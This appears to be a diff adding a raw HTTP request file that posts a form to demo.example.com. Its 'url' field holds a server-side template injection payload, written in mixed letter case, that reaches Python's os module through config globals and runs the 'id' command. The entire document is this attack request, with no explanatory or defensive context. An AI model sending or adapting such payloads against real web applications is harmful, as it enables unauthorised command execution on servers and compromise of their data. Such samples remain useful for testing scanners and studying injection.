@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 70
+Connection: close
+
+url={{cOnFiG.__cLaSs__.__InIt__.__GlObAlS__['oS'].pOpEn('Id').ReAd()}}
